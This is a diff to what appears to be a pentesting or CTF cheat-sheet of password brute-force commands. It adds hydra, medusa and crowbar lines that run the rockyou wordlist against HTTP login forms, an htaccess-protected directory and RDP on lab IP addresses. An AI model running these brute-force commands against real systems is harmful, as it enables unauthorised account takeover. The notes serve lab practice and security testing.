@@ -28,13 +28,20 @@ SecLists has a nice default credentials wordlists:
 hydra -l username -P rockyou.txt ssh://<IP>
 ```
 
-## HTTP
+## HTTP POST
 
 ```shell
 hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong"
 ```
 
 ```
+hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
+```
+
+### htaccess
+
+```
+medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
 ```
 
 ## SMB
@@ -55,4 +62,10 @@ hydra -L users.txt -P passwords.txt smb://10.10.10.169
 
 ```shell
 crackmapexec winrm 10.10.140.97 -u username -p passwords.txt
+```
+
+## RDP
+
+```
+crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
 ```
